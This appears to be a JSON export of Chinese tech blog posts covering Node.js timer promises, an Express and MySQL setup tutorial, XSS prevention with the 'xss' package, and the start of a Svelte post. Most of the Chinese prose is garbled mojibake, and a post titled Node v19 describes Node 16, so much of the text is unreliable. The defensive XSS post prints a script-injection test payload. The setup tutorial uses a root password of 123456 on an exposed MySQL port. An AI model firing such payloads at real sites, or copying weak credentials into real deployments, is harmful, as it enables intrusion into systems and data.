å‡½æ•¸ï¼Ÿ\nç­”æ¡ˆä¹Ÿå¾ˆç°¡å–®ï¼Œä½¿ç”¨ Promise å°è£ä¸€å€‹ setTimeout å³å¯\n1 const sleep = (t = 0) =\u0026gt; new Promise(resolve =\u0026gt; setTimeout(resolve, t)); é‚£æœ‰äº† Timers Promise ä¹‹å¾Œå‘¢ï¼Œä½¿ç”¨ setTimeout ç›´æ¥å¯æ›¿ä»£ sleep åŠŸèƒ½ï¼Œé©šä¸é©šå–œã€‚\n1 2 3 import { setTimeout } from \u0026#39;timers/promises\u0026#39;; await setTimeout(100); setTimeout çš„ç¬¬äºŒå€‹åƒæ•¸æ¥æ”¶ä¸€å€‹å€¼ï¼Œä½œç‚º Promise æˆåŠŸå¾Œçš„è¿”å›å€¼\n1 2 3 4 const r = await setTimeout(100, \u0026#39;hello, world\u0026#39;); //=\u0026gt; hello, world console.log(r); è€Œç•¶ setInterval ä¹Ÿè®Šç‚º Promise å½¢å¼å¾Œï¼Œå°æ–¼æ¯é–“éš”ä¸€åˆ†é˜ä¾¿åŸ·è¡Œæ“ä½œçš„å®šæ™‚ä»»å‹™è€Œè¨€ï¼Œå…·æœ‰æ›´å¤§çš„å¯è®€æ€§\n1 2 3 4 5 6 7 import { setInterval } from \u0026#39;timers/promises\u0026#39;; for await (const startTime of setInterval(100, Date.now())) { const now = Date.now(); if ((now - startTime) \u0026gt; 1000) break; }; åº•å±¤ä¾è³´å‡ç´š æˆ‘å€‘çŸ¥é“ï¼ŒNode åŸºæ–¼ v8ã€libuvã€llhttp ç­‰è«¸å¤šä¾è³´ï¼Œé€™æ¬¡å®ƒå°è«¸å¤šä¾è³´é€²è¡Œäº†å‡ç´šã€‚å¦‚åŒæˆ‘å€‘çš„æ¥­å‹™é …ç›®ä¾è³´æ–¼è«¸å¤šè»Ÿä»¶åŒ…ï¼Œæ¯ä¸€æ¬¡ä¾è³´çš„å‡ç´šä¹Ÿæœƒå°æ€§èƒ½é€ æˆä¸å°‘æå‡\nv8 å‡ç´šåˆ° 9.0ï¼Œä¸»è¦æ˜¯ ECMAScript RegExp Match Indices llhttp å‡ç´šåˆ° 6.0.0ï¼Œç”¨ä»¥è§£æ HTTP å ±æ–‡ icu å‡ç´šåˆ° 69.1 npm å‡ç´šåˆ° 7.10.0 ä½¿ç”¨ process.versions å¯çœ‹åˆ°ç›¸é—œä¾è³´çš„ç‰ˆæœ¬è™Ÿ\n1 \u0026gt; process.versions export 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 { \u0026#34;node\u0026#34;: \u0026#34;16.0.0\u0026#34;, \u0026#34;v8\u0026#34;: \u0026#34;9.0.257.17-node.10\u0026#34;, \u0026#34;uv\u0026#34;: \u0026#34;1.41.0\u0026#34;, \u0026#34;zlib\u0026#34;: \u0026#34;1.2.11\u0026#34;, \u0026#34;brotli\u0026#34;: \u0026#34;1.0.9\u0026#34;, \u0026#34;ares\u0026#34;: \u0026#34;1.17.1\u0026#34;, \u0026#34;modules\u0026#34;: \u0026#34;93\u0026#34;, \u0026#34;nghttp2\u0026#34;: \u0026#34;1.42.0\u0026#34;, \u0026#34;napi\u0026#34;: \u0026#34;8\u0026#34;, \u0026#34;llhttp\u0026#34;: \u0026#34;6.0.0\u0026#34;, \u0026#34;openssl\u0026#34;: \u0026#34;1.1.1k+quic\u0026#34;, \u0026#34;cldr\u0026#34;: \u0026#34;39.0\u0026#34;, \u0026#34;icu\u0026#34;: \u0026#34;69.1\u0026#34;, \u0026#34;tz\u0026#34;: \u0026#34;2021a\u0026#34;, \u0026#34;unicode\u0026#34;: \u0026#34;13.0\u0026#34;, \u0026#34;ngtcp2\u0026#34;: \u0026#34;0.1.0-DEV\u0026#34;, \u0026#34;nghttp3\u0026#34;: \u0026#34;0.1.0-DEV\u0026#34; } btoa èˆ‡ atob é—œæ–¼ Base64 çš„è½‰åŒ–ï¼ŒNode åœ¨ä»¥å‰ä½¿ç”¨äº† Buffer.fromï¼Œè€Œç¾åœ¨æ”¯æŒ btoa/atob èˆ‡ç€è¦½å™¨ç’°å¢ƒä¿æŒäº†ä¸€è‡´ã€‚\nè€Œå°æ–¼ä¸€å€‹ SSR é …ç›®è€Œè¨€ï¼ŒåŸ·è¡Œç’°å¢ƒçš„å€åˆ†å°‡ç„¡é—œç·Šè¦ï¼Œçµ±ä¸€ä½¿ç”¨ btoa/atob å°±å¥½äº†\n1 2 3 4 5 6 7 8 const base64 = { encode (v: string) { return isBrowser ? btoa(v) : Buffer.from(v).toString(\u0026#39;base64\u0026#39;); }, decode (v: string) { return isBrowser ? atob(v) : Buffer.from(v, \u0026#39;base64\u0026#39;).toString(); } } æ›´å¤š é—œæ–¼ Node16 å‡ç´šçš„è«¸å¤šå°ç´°ç¯€ï¼Œå¯åƒé–±ç‰ˆæœ¬ç™¼å¸ƒç²å–æ›´å¤šä¿¡æ¯ï¼Œå¯æŒçºŒ Wayne\u0026rsquo;s Blog å°å„è»Ÿä»¶æ¯ä¸€æ¬¡é‡å¤§ç‰ˆæœ¬å‡ç´šçš„èªªæ˜è¬›è§£ã€‚\n","date":"2022-10-24T00:00:00Z","image":"https://live.staticflickr.com/65535/52449163172_6f0c5b3278_o.jpg","permalink":"https://wayneblog.ga/2022-10-24/nodejs-v19-release/","title":"Node v19 æ­£å¼ç™¼å¸ƒ"},{"content":" åƒè€ƒç¶²ç«™\nåƒè€ƒç¶²ç«™\næœ¬æ–‡ä¸»è¦æ˜¯å±•ç¤ºä½¿ç”¨ Express å’Œ MySQL ä¾†æ­å»ºé …ç›®æ¡†æ¶çš„æ­¥é©Ÿï¼Œå±•ç¤ºç­å¦‚ä½•æ­å»ºé …ç›®ä¸¦é€²è¡ŒåŸºæœ¬æ“ä½œã€‚\nå‰µå»ºé …ç›® Express æ˜¯åŸºæ–¼ Node.js å¹³å°ï¼Œå¿«é€Ÿã€é–‹æ”¾ã€æ¥µç°¡çš„ Web é–‹ç™¼æ¡†æ¶ã€‚\nå…¨å±€å®‰è£ express-generator express-generator æ˜¯ Express æ‡‰ç”¨ç¨‹åºç”Ÿæˆå™¨å·¥å…·ï¼Œæˆ‘å€‘å¯ä»¥ä½¿ç”¨å®ƒä¾†å¿«é€Ÿå‰µå»ºæ‡‰ç”¨ç¨‹åºæ¡†æ¶ã€‚\n1 2 3 4 npm install -g express-generator # (expressFrame æ˜¯é …ç›®å) express expressFrame é …ç›®çš„ç›®éŒ„çµæ§‹\nbin/www æ˜¯å•Ÿå‹•å…¥å£æ–‡ä»¶ï¼Œåœ¨è£¡é¢å¯ä»¥è¨­ç½®ç«¯å£è™Ÿç­‰ ä¸‹è¼‰ä¾è³´ å‰µå»ºå¥½é …ç›®ä¹‹å¾Œï¼Œè£¡é¢æœ‰åŒ…å«åŸºæœ¬çš„é …ç›®æ–‡ä»¶ï¼Œä¹Ÿæœ‰ç›¸é—œä¾è³´\n1 npm install å•Ÿå‹•é …ç›® 1 2 3 4 npm start # å•Ÿå‹•å‘½ä»¤é‚„å¯ä»¥æ˜¯ï¼š # node ./bin/www å®‰è£ nodemon å¯ä»¥å®‰è£ nodemon ä¾†ç›£æ§ node.js æºä»£ç¢¼çš„ä»»ä½•è®ŠåŒ–å’Œè‡ªå‹•é‡å•Ÿä½ çš„æœå‹™å™¨\nå…¨å±€å®‰è£ nodemonï¼š\n1 npm install -g nodemon å•Ÿå‹•é …ç›®\n1 nodemon bin/www é€™å°±å•Ÿå‹•æˆåŠŸå•¦\nç€è¦½å™¨æ‰“é–‹http://localhost:3000å°±èƒ½çœ‹åˆ°é é¢å•¦\nå®‰è£ winston æ·»åŠ æ‰“å°æ—¥èªŒæ–‡ä»¶ é€™è£¡æ¡ç”¨çš„æ˜¯ winston æ—¥èªŒ\nå…·é«”ç”¨æ³•å¯çœ‹æ–‡æª”ï¼šhttps://www.npmjs.com/package/winston\n1 npm i winston é…ç½®æ‰“å°æ—¥èªŒæ ¼å¼ åœ¨é …ç›®çš„æ ¹ç›®éŒ„æ·»åŠ ä¸€å€‹é…ç½®æ‰“å°æ—¥èªŒæ ¼å¼çš„æ–‡ä»¶ logger.js ï¼ˆæ­¤æ–‡ä»¶åœ¨ github ä¸Šï¼‰\nä¿®æ”¹ app.js çš„é…ç½® ä¿®æ”¹é …ç›®é»˜èªçš„è®Šé‡åï¼š\nå°‡ const logger = require('morgan'); æ”¹æˆï¼šconst morgan = require('morgan') ç›¸æ‡‰çš„ä¹Ÿè¦æŠŠ app.use(logger('dev')); æ”¹æˆï¼šapp.use(morgan('dev')); 1 2 3 4 5 6 7 // ... - const logger = require(\u0026#39;morgan\u0026#39;); + const morgan = require(\u0026#39;morgan\u0026#39;); - app.use(logger(\u0026#39;dev\u0026#39;)); + app.use(morgan(\u0026#39;dev\u0026#39;)); // ... å¼•å…¥ logger.js æ–‡ä»¶ 1 const logger = require(\u0026#39;./logger\u0026#39;) ä¿®æ”¹éŒ¯èª¤è™•ç† å°‡éŒ¯èª¤æ‰“å°åˆ°æ—¥èªŒä¸Š\næ¸¬è©¦æ—¥èªŒæ˜¯å¦æ‰“å°æˆåŠŸ è«‹æ±‚ä¸€å€‹ä¸å­˜åœ¨çš„è·¯ç”±ï¼Œå¦‚ï¼šhttp://localhost:3000/hello\næ‰“é–‹æ—¥èªŒæ–‡ä»¶ï¼Œçœ‹åˆ°é€™æ¢éŒ¯èª¤è¢«æ‰“å°å‡ºä¾†å°±æˆåŠŸå•¦\nMySQL å•Ÿå‹•æ•¸æ“šåº« é€™è£¡ä½¿ç”¨çš„æ–¹æ³•æ˜¯ç”¨ Docker å®‰è£ MySQL\né€™è£¡æ˜¯å®‰è£çš„æ•™ç¨‹ï¼šhttps://www.runoob.com/docker/docker-install-mysql.html\ndocker æ‹‰å– MySQL é¡åƒ 1 docker pull mysql:latest æŸ¥çœ‹æœ¬åœ°é¡åƒ 1 docker images é‹è¡Œå®¹å™¨ 1 2 # docker run -itd --name {å®¹å™¨å} -p 3306:3306 -e MYSQL_ROOT_PASSWORD={MySQL root å¯†ç¢¼} mysql docker run -itd --name mysql-test -p 3306:3306 -e MYSQL_ROOT_PASSWORD=123456 mysql åƒæ•¸èªªæ˜ï¼š\n-p 3306:3306ï¼šæ˜ å°„å®¹å™¨æœå‹™çš„3306ç«¯å£åˆ°å®¿ä¸»æ©Ÿçš„3306ç«¯å£ï¼Œå¤–éƒ¨ä¸»æ©Ÿå¯ä»¥ç›´æ¥é€é å®¿ä¸»æ©Ÿip:3306 è¨ªå•åˆ° MySQL çš„æœå‹™ã€‚ MYSQL_ROOT_PASSWORD=123456ï¼šè¨­ç½® MySQL æœå‹™ root ç”¨æˆ¶çš„å¯†ç¢¼ã€‚ å®‰è£æˆåŠŸ é€é docker ps å‘½ä»¤æŸ¥çœ‹æ˜¯å¦å®‰è£æˆåŠŸ\næœ¬æ©Ÿå¯ä»¥é€šé root / 123456 è¨ªå• MySQL æœå‹™ã€‚\nå®‰è£æ•¸æ“šåº«ç®¡ç†å·¥å…· Sequel Pro macOS ç”¨æˆ¶å®‰è£ navicat windows ç”¨æˆ¶å®‰è£ é€™è£¡é¸æ“‡ç”¨ Sequel Pro å•Ÿå‹•å¥½æ•¸æ“šä¹‹å¾Œï¼Œå°±åœ¨ Sequel Pro é€£æ¥æ•¸æ“šåº«ï¼Œå¯†ç¢¼æ˜¯å•Ÿå‹•æ•¸æ“šåº«æ™‚è‡ªå·±è¨­ç½®çš„å¯†ç¢¼\nä½¿ç”¨ Navicat æ•¸æ“šåº«ç®¡ç†å·¥å…·é€£ç·šæ™‚ï¼Œå‡ºç¾éŒ¯èª¤ è‹¥å‡ºç¾ 1251 - Client does not support authentication protocol requested by server; consider upgrading MySQL client éŒ¯èª¤ï¼ŒåŸå› ç‚ºï¼š\nmysql8 ä¹‹å‰çš„ç‰ˆæœ¬ï¼ŒåŠ å¯†è¦å‰‡æ˜¯ mysql_native_passwordï¼Œè€Œ mysql8 ä¹‹å¾Œçš„ç‰ˆæœ¬ï¼ŒåŠ å¯†è¦å‰‡æ˜¯ caching_sha2_password\nè§£æ±ºæ–¹æ³•ï¼š å‡ç´š navicat é©…å‹•ã€‚ é€²åˆ°å®¹å™¨å…§ï¼ŒæŠŠ mysql ç”¨æˆ¶ç™»å…¥å¯†ç¢¼åŠ å¯†è¦å‰‡é‚„åŸæˆ mysql_native_password ä»¥ä¸‹æ¡ç”¨æ–¹æ³•2è§£æ±ºï¼Œæ“ä½œå¦‚ä¸‹ï¼š\n1. æ‰“é–‹ cmdï¼Œè¼¸å…¥ä»¥ä¸‹æŒ‡ä»¤ä»¥ bash é€²å…¥å®¹å™¨ï¼š 1 2 # docker exec -it {å®¹å™¨å} bash docker exec -it mysql-test bash 2. ä½¿ç”¨ mysql æŒ‡ä»¤é€£ç·šè³‡æ–™åº«ï¼š 1 mysql -u root -p 3. ä½¿ç”¨ mysql æŒ‡ä»¤æŸ¥è©¢ç”¨æˆ¶è¨Šæ¯ï¼š 1 select host, user, plugin, authentication_string from mysql.user; host ç‚º % è¡¨ç¤ºä¸é™åˆ¶ ipã€localhost è¡¨ç¤ºæœ¬æ©Ÿä½¿ç”¨\nplugin é mysql_native_password å‰‡éœ€è¦ä¿®æ”¹å¯†ç¢¼\n4. ä½¿ç”¨ mysql æŒ‡ä»¤ä¿®æ”¹å¯†ç¢¼ï¼š æ›´æ–° user ç‚º rootï¼Œ host ç‚º % çš„å¯†ç¢¼ç‚º 123456 1 ALTER USER \u0026#39;root\u0026#39;@\u0026#39;%\u0026#39; IDENTIFIED WITH mysql_native_password BY \u0026#39;123456\u0026#39;; æ›´æ–° user ç‚º rootï¼Œ host ç‚º localhost çš„å¯†ç¢¼ç‚º 123456 1 ALTER USER \u0026#39;root\u0026#39;@\u0026#39;localhost\u0026#39; IDENTIFIED WITH mysql_native_password BY \u0026#39;123456\u0026#39;; 5. å†æ¬¡åœ¨ Navicat ä¸­é€£æ¥ mysqlï¼Œé€£æ¥æˆåŠŸ å‰µå»ºæ•¸æ“šåº« ä½¿ç”¨æ•¸æ“šåº«ç®¡ç†å·¥å…·æ–°å»ºæ•¸æ“šåº« database åç¨±ç‚ºï¼šexpressFrame\né€²å…¥ expressFrame åº«ï¼Œæ–°å»ºç”¨æˆ¶ä¿¡æ¯è¡¨ç‚º user ï¼Œé»˜èªæœ‰ id å­—æ®µï¼Œéœ€è¦å†æ·»åŠ ä»¥ä¸‹å¿…è¦å­—æ®µï¼š\nå­—æ®µï¼šid\n1 2 Field:name Type:VARCHAR LENGTH:255 Comment:å§“å Field:phone Type:VARCHAR LENGTH:255 Comment:æ‰‹æ©Ÿè™Ÿ ä½¿ç”¨ Knex.js å¢åˆªæ”¹æŸ¥æ•¸æ“šåº« Knex.js æ˜¯ç‚º Postgresã€MSSQLã€MySQLã€MariaDBã€SQLite3ã€Oracle å’Œ Amazon Redshift è¨­è¨ˆçš„ SQL æŸ¥è©¢æ§‹å»ºå™¨ï¼Œå…¶è¨­è¨ˆéˆæ´»ï¼Œä¾¿æ–¼æ”œå¸¶ä¸¦ä¸”ä½¿ç”¨èµ·ä¾†éå¸¸æœ‰è¶£ã€‚Knex çš„ä¸»è¦ç›®æ¨™ç’°å¢ƒæ˜¯ Node.jsï¼Œæ‚¨éœ€è¦å®‰è£è©² knex åº«ï¼Œç„¶å¾Œå®‰è£é©ç•¶çš„æ•¸æ“šåº«åº«ï¼špg é©ç”¨æ–¼ PostgreSQLã€CockroachDB å’Œ Amazon Redshiftï¼Œpg-native å°æ–¼å…·æœ‰æœ¬æ©Ÿ C++ libpq ç¶å®šçš„ PostgreSQLï¼ˆéœ€è¦å®‰è£ PostgresSQL æ‰èƒ½éˆæ¥ï¼‰ï¼Œmysql é©ç”¨æ–¼ MySQL æˆ– MariaDBï¼Œsqlite3 é©ç”¨æ–¼ SQLite3ï¼Œtedious é©ç”¨æ–¼ MSSQLã€‚\nFlag Library pg PostgreSQLã€CockroachDBã€Amazon Redshift pg-native æœ¬æ©Ÿ C++ libpq ç¶å®šçš„ PostgreSQLï¼ˆéœ€è¦å®‰è£ PostgresSQL æ‰èƒ½éˆæ¥ï¼‰ mysql MySQLã€MariaDB sqlite3 SQLite3 tedious MSSQL ä¸‹è¼‰ç›¸é—œä¾è³´ 1 npm install -save knex mysql æ·»åŠ é…ç½®ä¿¡æ¯ åœ¨é …ç›®æ ¹ç›®éŒ„ä¸‹ï¼Œæ–°å»ºé…ç½®ä¿¡æ¯ config.jsï¼Œä¹‹å¾Œçš„é…ç½®ä¿¡æ¯æ¶‰åŠåˆ°æ•¸æ“šåº«å’Œå¯†ç¢¼ï¼Œä¸ä¸Šå‚³åˆ° Github ç­‰è¨—ç®¡å¹³å°ï¼Œæ‰€ä»¥éœ€è¦å–®ç¨è¨­ç½®ï¼Œä½¿ç”¨ .gitignore é¿å…ä¸Šå‚³ã€‚ä¹‹å¾Œæ•æ„Ÿçš„é…ç½®ä¿¡æ¯ï¼Œéƒ½å°‡åœ¨æ­¤é…ç½®ã€‚host åœ°å€ç‚ºæ•¸æ“šåº«çš„æœå‹™åœ°å€ï¼Œæœ¬åœ°ç‚º 127.0.0.1\nconfig.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 const configs = { mysql: { host: \u0026#39;127.0.0.1\u0026#39;, port: \u0026#39;3306\u0026#39;, user: \u0026#39;root\u0026#39;, password: \u0026#39;123456\u0026#39;, // è‡ªå·±è¨­ç½®çš„å¯†ç¢¼ database: \u0026#39;expressFrame\u0026#39; // æ•¸æ“šåº«çš„åå­— }, // æ‰“å°é”™è¯¯ log: { error (message) { console.log(\u0026#39;[knex error]\u0026#39;, message) } } } module.exports = configs æ–°å»º .gitignore åœ¨é …ç›®æ ¹ç›®éŒ„ä¸‹ï¼Œæ–°å»º .gitignore é¿å…ä¸Šå‚³ config.js ã€logã€ node_modules ç­‰ä¸éœ€è¦è¢«ä¸Šå‚³åˆ° Github çš„æ–‡ä»¶ã€‚\n.gitignore 1 2 3 4 5 6 7 .DS_Store .idea npm-debug.log yarn-error.log node_modules log config.js æ•¸æ“šåº«é…ç½® æ–°å»º models/knex.jsï¼Œåˆå§‹åŒ–é…ç½® knex\nmodels/knex.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 // å¼•ç”¨é…ç½®æ–‡ä»¶ const configs = require(\u0026#39;../config\u0026#39;); // æŠŠé…ç½®æ–‡ä»¶ä¸­çš„ä¿¡æ¯ï¼Œè¨­ç½®åœ¨åˆå§‹åŒ–é…ç½®ä¸­ module.exports = require(\u0026#39;knex\u0026#39;)({ client: \u0026#39;mysql\u0026#39;, connection: { host: configs.mysql.host, port: configs.mysql.port, user: configs.mysql.user, password: configs.mysql.password, database: configs.mysql.database }, // æ‰“å°éŒ¯èª¤ log: { error (message) { console.log(\u0026#39;[knex error]\u0026#39;, message) } } }) knex å¢åˆªæ”¹æŸ¥ åœ¨ models ä¸‹æ–°å»ºæ–‡ä»¶ base.js\nmodels/base.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 const knex = require(\u0026#39;../models/knex\u0026#39;); class Base{ constructor(props){ this.table = props; } // æŸ¥æ‰¾ all (){ return knex(this.table).select(); } // æ–°å¢ insert (params){ return knex(this.table).insert(params); } // æ›´æ”¹ update (id, params){ return knex(this.table).where(\u0026#39;id\u0026#39;, \u0026#39;=\u0026#39;, id).update(params); } // åˆ é™¤ delete (id){ return knex(this.table).where(\u0026#39;id\u0026#39;, \u0026#39;=\u0026#39;, id).del(); } } module.exports = Base; æ–°å»ºç”¨æˆ¶æ¨¡å‹ åœ¨ models ä¸‹æ–°å»ºæ–‡ä»¶ user.js\nmodels/user.js 1 2 3 4 5 6 7 8 9 10 const Base = require(\u0026#39;./base\u0026#39;); class User extends Base { // å®šç¾©åƒæ•¸é»˜èªå€¼ç‚º user è¡¨ constructor(props = \u0026#39;user\u0026#39;){ super(props); } } module.exports = new User(); æ–°å»ºç”¨æˆ¶æ§åˆ¶å™¨ åœ¨æ ¹ç›®éŒ„æ–°å»ºæ§åˆ¶å™¨æ–‡ä»¶å¤¾ controllersï¼Œåœ¨ controllers æ–°å»º user.jsï¼Œä¸¦è¨­ç½® showUser æ–¹æ³•\ncontrollers/user.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 // å¼•ç”¨ç”¨æˆ·æ¨¡ç‰ˆæ•°æ® const User = require(\u0026#39;../models/user.js\u0026#39;); const userController = { // showUser ç²å–ç”¨æˆ¶æ•¸æ“šä¸¦è¿”å›åˆ°é é¢ showUser: async function(req,res,next){ try{ let userData = await User.all() res.json({ code: 200, message: \u0026#34;æ“ä½œæˆåŠŸ\u0026#34;, data: userData }) }catch(e){ res.json({ code: 0, message: \u0026#34;æ“ä½œå¤±æ•—\u0026#34;, data: e }) } }, } module.exports = userController; æ·»åŠ ç²å–ç”¨æˆ¶æ¥å£ ä¿®æ”¹è·¯ç”± routes/index.jsï¼Œæ·»åŠ ç²å–ç”¨æˆ¶ä¿¡æ¯çš„æ¥å£\nroutes/index.js 1 2 3 4 const userController = require(\u0026#39;../controllers/user\u0026#39;); // ç²å–ç”¨æˆ¶ä¿¡æ¯ router.get(\u0026#39;/get_user\u0026#39;, userController.showUser); æ¸¬è©¦æ¥å£ è¨ªå•ä¸€ä¸‹ http://localhost:3000/get_user\næŸ¥çœ‹æ¥å£è¿”å›çš„æ•¸æ“š\né€™å°±å¤§åŠŸå‘Šæˆå•¦ï½\ngithubåœ°å€ï¼šhttps://github.com/wjdesign/nodejsExpressMysqlDemo\nèµ°éè·¯éé»å€‹è´Šå”„ï½\n","date":"2022-10-21T00:00:00Z","image":"https://live.staticflickr.com/65535/52443177409_7e96fe402c_o.png","permalink":"https://wayneblog.ga/2022-10-21/nodejs-express-mysql/","title":"Node.js + Express + MySQL æ­å»ºé …ç›®æ¡†æ¶"},{"content":" åƒè€ƒç¶²ç«™\nç°¡ä»‹ xss æ˜¯å¸¸è¦‹çš„æ”»æ“Šæ–¹å¼ä¹‹ä¸€ï¼Œä¸ç®¡æ˜¯å‰ç«¯é‚„æ˜¯å¾Œç«¯éƒ½è¦å°æ­¤æœ‰æ‰€é˜²ç¯„æ‰è¡Œã€‚\næœ¬æ–‡ä¸»è¦è¬›è§£ä½¿ç”¨ NodeJS é–‹ç™¼çš„å¾Œç«¯ç¨‹åºæ‡‰è©²å¦‚ä½•é˜²ç¯„ xss æ”»æ“Šã€‚\nxssæ¼”ç¤º xss æ”»æ“Šæ–¹å¼ä¸»è¦æ˜¯åœ¨åœ¨é é¢å±•ç¤ºå…§å®¹ä¸­æ‘»é›œ jsä»£ç¢¼ï¼Œä»¥ç²å–ç¶²é ä¿¡æ¯ã€‚\nå¸¸è¦‹çš„æ”»æ“Šåœ°æ–¹æœ‰ï¼š\né›»å•†ç”¢å“è©•åƒ¹å€ï¼šæŸç”¨æˆ¶æäº¤çš„è©•åƒ¹å¸¶æœ‰å¯åŸ·è¡Œçš„jsä»£ç¢¼ï¼Œå…¶ä»–ç”¨æˆ¶æŸ¥çœ‹è©²è©•è«–æ™‚å°±æœƒåŸ·è¡Œé‚£æ®µjsä»£ç¢¼ã€‚ åšå®¢ç¶²ç«™ï¼šæŸç”¨æˆ¶åœ¨åšå®¢çš„æ¨™é¡Œæˆ–è€…å…§å®¹ä¸­å¸¶æœ‰å¯åŸ·è¡Œçš„jsä»£ç¢¼ï¼Œå…¶ä»–ç”¨æˆ¶æŸ¥çœ‹è©²åšå®¢æ™‚é‚£æ®µ jsä»£ç¢¼ å°±æœƒè¢«åŸ·è¡Œã€‚ æ¯”å¦‚åœ¨è¼¸å…¥æ¡†è¼¸å…¥\n1 \u0026lt;script\u0026gt;alert(1234)\u0026lt;/script\u0026gt; åˆ¥çš„ç”¨æˆ¶åœ¨è‡ªå·±é é¢è¦å±•ç¤ºä¸Šé¢é€™æ®µå…§å®¹å€‹ï¼Œé é¢æœ‰å¯èƒ½æœƒå½ˆå‡ºä¸€å€‹å½ˆçª—ã€‚\né€™å€‹ä¾‹å­åªæ˜¯å½ˆå‡ºä¸€å€‹å°è©±æ¡†ï¼Œå¦‚æœäººå®¶æœ‰æƒ¡æ„ï¼Œç²å–cookie ç­‰ä¿¡æ¯ï¼Œç„¶å¾Œå‚³çµ¦è‡ªå·±çš„æœå‹™å™¨ï¼Œé‚£å¾ŒæœçœŸçš„å¾ˆåš´é‡ã€‚\nxssé˜²ç¦¦ é é˜²æªæ–½ï¼šè½‰ç¾©ç‰¹æ®Šå­—ç¬¦\nç‰¹æ®Šç¬¦è™Ÿè½‰æ›\n1 2 3 4 5 6 \u0026amp; -\u0026gt; \u0026amp;amp; \u0026lt; -\u0026gt; \u0026amp;lt; \u0026gt; -\u0026gt; \u0026amp;gt; \u0026#34; -\u0026gt; \u0026amp;quot; \u0026#39; -\u0026gt; \u0026amp;#x27; / -\u0026gt; \u0026amp;#x2F; ä¸Šé¢æˆ‘ç¾…åˆ—äº†å¹¾å€‹å¸¸è¦‹çš„ç‰¹æ®Šå­—ç¬¦ã€‚å¾ä¸Šé¢çš„ä¾‹å­å¯ä»¥çœ‹å‡ºï¼Œè¼¸å…¥äº† \u0026lt;script\u0026gt; æ¨™ç±¤å¾Œï¼Œè£¡é¢çš„å…§å®¹æœ‰å¯èƒ½æœƒè¢«åŸ·è¡Œã€‚\nå¦‚æœæˆ‘å€‘æŠŠ \u0026lt;script\u0026gt; æ”¹æˆ \u0026amp;lt;script\u0026amp;gt; é‚£éº¼ç€è¦½å™¨å°±ä¸æŠŠé€™æ®µå…§å®¹çœ‹æˆæ˜¯å¯åŸ·è¡Œä»£ç¢¼ã€‚\nåœ¨æ—¥å¸¸é–‹ç™¼ä¸­ï¼Œæˆ‘å€‘ä¸éœ€è¦è‡ªå·±ç·¨å¯«è½‰ç¾©åŠŸèƒ½çš„ä»£ç¢¼ï¼Œåªéœ€è¦ä¸‹è¼‰ xss çš„ä¾è³´åŒ…å°±è¡Œã€‚\nå®‰è£ xss ä¾è³´åŒ…\n1 npm install xss --save ä½¿ç”¨ xssã€‚ xss å…¶å¯¦æ˜¯ä¸€å€‹æ–¹æ³•ï¼Œåªéœ€è¦æŠŠè¦è½‰ç¾©çš„å…§å®¹å‚³å…¥ xss æ–¹æ³•å³å¯ã€‚\n1 2 3 4 const xss = require(\u0026#39;xss\u0026#39;) const content = xss(\u0026#39;\u0026lt;script\u0026gt;alert(1234)\u0026lt;/script\u0026gt;\u0026#39;) console.log(content) æœ€å¾Œè¼¸å‡º\n1 \u0026amp;lt;script\u0026amp;gt;alert(1234)\u0026amp;lt;/script\u0026amp;gt; ä»¥ä¸Šå°±æ˜¯ xssæ”»æ“Š åœ¨å¾Œç«¯çš„é˜²ç¦¦æ–¹æ³•ã€‚\nå¦‚æœåš´è¬¹ä¸€é»çš„è©±ï¼Œåœ¨å‰ç«¯ä¹Ÿå¯ä»¥æŠŠæ–‡æœ¬åŸŸçš„å…§å®¹è£¡çš„ç‰¹æ®Šå­—ç¬¦è½‰ç¾©ä¸€éå†å‚³çµ¦å¾Œç«¯ã€‚\nå¾Œç«¯å‚³çµ¦å‰ç«¯çš„å…§å®¹æœ‰å¯èƒ½æœƒåœ¨é é¢å±•ç¤ºæˆ \u0026amp;lt;script\u0026amp;gt;alert(1234)\u0026amp;lt;/script\u0026amp;gt;ï¼Œé€™éƒ¨åˆ†éœ€è¦å‰ç«¯è‡ªå·±å»è™•ç†ã€‚\næ’å‰‡èŠ±é‚Šæ–°è\nä¹‹å‰çœ‹åˆ°æœ‰å‰‡æ–°èèªª Vue ä¸å®‰å…¨ï¼ŒæŸäº›ZFé …ç›®ä¸­ä½¿ç”¨ Vue å—åˆ°äº† xss æ”»æ“Šã€‚å¾Œç«¯ç”©é‹çµ¦å‰ç«¯ï¼Œå‰ç«¯ç”©é‹çµ¦äº† Vueã€‚\nå¾Œä¾†è½èªªæ˜¯å‰ç«¯èƒ¡äº‚ä½¿ç”¨ v-html æ¸²æŸ“å…§å®¹å°è‡´çš„ï¼Œè€Œ v-html é€™æ±è¥¿å®˜æ–¹æ–‡æª”ä¹Ÿæç¤ºäº†æœ‰å¯èƒ½å—åˆ° xss æ”»æ“Šã€‚\nå°¤é›¨æºªï¼šå¾ˆå¤šäººå°±æ˜¯ä¸çœ‹æ–‡æª”\n","date":"2022-10-21T00:00:00Z","image":"https://live.staticflickr.com/65535/52442821071_35fc2e7087_o.png","permalink":"https://wayneblog.ga/2022-10-21/nodejs-prevent-xss/","title":"NodeJS é˜²æ­¢ xss æ”»æ“Š"},{"content":" åƒè€ƒç¶²ç«™\nåƒè€ƒç¶²ç«™\nåƒè€ƒç¶²ç«™\nåƒè€ƒç¶²ç«™\nå…¶å¯¦åœ¨å¾ˆä¹…ä¹‹å‰æˆ‘å°±æ³¨æ„åˆ° Svelteï¼Œä½†ä¸€ç›´æ²’æŠŠé€™å€‹æ¡†æ¶æ”¾åœ¨å¿ƒä¸Šã€‚\nå› ç‚ºæˆ‘ä¹‹å‰çš„å·¥ä½œä¸»è¦ä½¿ç”¨ Vueï¼Œä½†å®Œå…¨æ²’é‡åˆ°éä½¿ç”¨ Svelte çš„é …ã€‚\nç›´åˆ° Vite çš„å‡ºç¾ï¼Œæˆ‘æ‰é–‹å§‹é–‹å§‹é‡è¦– Svelteã€‚\nå¾ Vite æ–‡æª” è£¡å¯ä»¥çœ‹åˆ°å®ƒæ”¯æŒé€™äº›æ¨¡æ¿ï¼š\nJavaScript TypeScript vanilla vanilla vue vue react react preact preact lit lit svelte svelte 